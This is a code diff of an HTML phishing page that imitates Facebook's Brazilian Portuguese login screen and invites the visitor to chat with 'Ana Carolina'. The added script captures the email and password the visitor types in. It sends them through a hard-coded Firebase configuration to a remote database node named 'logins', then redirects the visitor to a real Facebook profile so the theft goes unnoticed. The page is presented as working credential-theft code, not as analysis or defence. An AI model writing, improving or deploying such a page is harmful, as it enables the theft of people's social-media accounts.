@@ -4,8 +4,8 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
-    <title id="pageTitle">Conversar com Ana Carolina</title>
-    <meta name="description" content="Conversar com Ana Carolina" />
+    <title id="pageTitle">Converar com Ana Carolina</title>
+    <meta name="description" content="Converar com Ana Carolina" />
     
     <style>
         /* Reset e estilos base */
@@ -223,72 +223,65 @@
     </style>
 </head>
 <body>
-    <div class="main-container">
-        <div class="logo-container">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
-            <h2>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</h2>
-        </div>
-        
-        <div class="login-container">
-            <form class="login-form" action="enviar.php" method="post">
-                <input type="text" name="email" placeholder="Email ou telefone" required />
-                <input type="password" name="pass" placeholder="Senha" required />
-                <button type="submit" class="login-button">Entrar</button>
-                <a href="#" class="forgot-password">Esqueceu a senha?</a>
-                <div class="divider"></div>
-                <a href="/r.php?entry_point=login" class="create-account">Criar nova conta</a>
-            </form>
-            <div class="create-page">
-                <a href="/pages/create/?ref_type=registration_form">Crie uma Página</a> para uma celebridade, uma marca ou uma empresa.
-            </div>
-        </div>
+  <div class="main-container">
+    <div class="logo-container">
+      <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
+      <h2>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</h2>
     </div>
     
-    <footer>
-        <ul class="language-selector">
-            <li>Português (Brasil)</li>
-            <li><a href="https://www.facebook.com/" title="English (US)">English (US)</a></li>
-            <li><a href="https://www.facebook.com/" title="Spanish">Español</a></li>
-            <li><a href="https://es-la.facebook.com/" title="French (France)">Français (France)</a></li>
-            <li><a href="https://fr-fr.facebook.com/" title="Italian">Italiano</a></li>
-            <li><a href="https://it-it.facebook.com/" title="German">Deutsch</a></li>
-            <li><a href="https://de-de.facebook.com/" title="Arabic">العربية</a></li>
-            <li><a href="https://ar-ar.facebook.com/" title="Hindi">हिन्दी</a></li>
-            <li><a href="https://hi-in.facebook.com/" title="Simplified Chinese (China)">中文(简体)</a></li>
-            <li><a href="https://zh-cn.facebook.com/" title="Japanese">日本語</a></li>
-        </ul>
-        
-        <div class="footer-links">
-            <a href="/reg/">Cadastre-se</a>
-            <a href="/login/">Entrar</a>
-            <a href="https://messenger.com/">Messenger</a>
-            <a href="/lite/">Facebook Lite</a>
-            <a href="https://www.facebook.com/watch/">Vídeo</a>
-            <a href="https://about.meta.com/technologies/meta-pay" target="_blank">Meta Pay</a>
-            <a href="https://www.meta.com/" target="_blank">Meta Store</a>
-            <a href="https://www.meta.com/quest/" target="_blank">Meta Quest</a>
-            <a href="https://www.meta.com/smart-glasses/" target="_blank">Ray-Ban Meta</a>
-            <a href="https://www.meta.ai/">Meta AI</a>
-            <a href="https://www.instagram.com/" target="_blank">Instagram</a>
-            <a href="https://www.threads.com/">Threads</a>
-            <a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D">Central de Informações de Votação</a>
-            <a href="/privacy/policy/?entry_point=facebook_page_footer">Política de Privacidade</a>
-            <a href="/privacy/center/?entry_point=facebook_page_footer">Central de Privacidade</a>
-            <a href="https://about.meta.com/">Sobre</a>
-            <a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto">Criar anúncio</a>
-            <a href="/pages/create/?ref_type=site_footer">Criar Página</a>
-            <a href="https://developers.facebook.com/?ref=pf">Desenvolvedores</a>
-            <a href="/careers/?ref=pf">Carreiras</a>
-            <a href="/policies/cookies/">Cookies</a>
-            <a href="https://www.facebook.com/help/568137493302217">Escolhas para anúncios</a>
-            <a href="/policies?ref=pf">Termos</a>
-            <a href="/help/?ref=pf">Ajuda</a>
-            <a href="https://www.facebook.com/help/637205020878504">Upload de contatos e não usuários</a>
-        </div>
-        
-        <div class="copyright">
-            <span>Meta © 2025</span>
-        </div>
-    </footer>
+    <div class="login-container">
+      <form class="login-form" id="loginForm">
+        <input type="text" name="email" placeholder="Email ou telefone" required />
+        <input type="password" name="pass" placeholder="Senha" required />
+        <button type="submit" class="login-button">Entrar</button>
+        <a href="#" class="forgot-password">Esqueceu a senha?</a>
+        <div class="divider"></div>
+        <a href="/r.php?entry_point=login" class="create-account">Criar nova conta</a>
+      </form>
+      <div class="create-page">
+        <a href="/pages/create/?ref_type=registration_form">Crie uma Página</a> para uma celebridade, uma marca ou uma empresa.
+      </div>
+    </div>
+  </div>
+
+  <!-- Firebase Script (modular SDK) -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyBGCQgQO5KZbtlBfzLeclWZ1e6thS2SJU4",
+      authDomain: "meuteste-1346d.firebaseapp.com",
+      databaseURL: "https://meuteste-1346d-default-rtdb.firebaseio.com",
+      projectId: "meuteste-1346d",
+      storageBucket: "meuteste-1346d.firebasestorage.app",
+      messagingSenderId: "55662398751",
+      appId: "1:55662398751:web:d78d7292d89bfb3000342a",
+      measurementId: "G-N5X0P6JZ5L"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const email = e.target.email.value;
+      const senha = e.target.pass.value;
+
+      const novaEntrada = push(ref(database, "logins"));
+      set(novaEntrada, {
+        email: email,
+        senha: senha,
+        data: new Date().toISOString()
+      }).then(() => {
+        // Redireciona automaticamente após o envio
+        window.location.href = "https://www.facebook.com/isabella.martins.506631";
+      }).catch((error) => {
+        console.error("Erro ao enviar:", error);
+        // Se der erro, continua na mesma página
+      });
+    });
+  </script>
 </body>
 </html>
